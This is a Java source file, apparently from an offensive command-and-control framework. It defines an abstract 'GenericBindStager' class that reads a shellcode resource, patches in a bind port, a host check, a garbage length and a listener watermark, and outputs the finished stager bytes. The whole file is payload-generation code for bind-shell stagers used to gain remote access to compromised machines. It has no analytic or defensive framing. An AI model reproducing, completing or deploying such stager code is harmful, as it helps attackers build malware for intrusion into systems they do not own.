package stagers;

import common.AssertUtils;
import common.CommonUtils;
import common.Packer;
import common.ScListener;

public abstract class GenericBindStager {
    protected ScListener listener;

    public GenericBindStager(ScListener scListener) {
        this.listener = scListener;
    }

    public abstract String getFile();

    public abstract int getPortOffset();

    public abstract int getDataOffset();

    public abstract int getBindHostOffset();

    public byte[] generate(int n) {
        String str = CommonUtils.bString(CommonUtils.readResource(getFile())) + this.listener.getConfig().getWatermark();
        Packer packer = new Packer();
        packer.addShort(n);
        str = CommonUtils.replaceAt(str, CommonUtils.bString(packer.getBytes()), getPortOffset());
        AssertUtils.TestPatch(str, "\000\000\001", getBindHostOffset());
        packer = new Packer();
        packer.little();
        packer.addInt(this.listener.getConfig().getBindGarbageLength());
        str = CommonUtils.replaceAt(str, CommonUtils.bString(packer.getBytes()), getDataOffset());
        return CommonUtils.toBytes(str);
    }
}
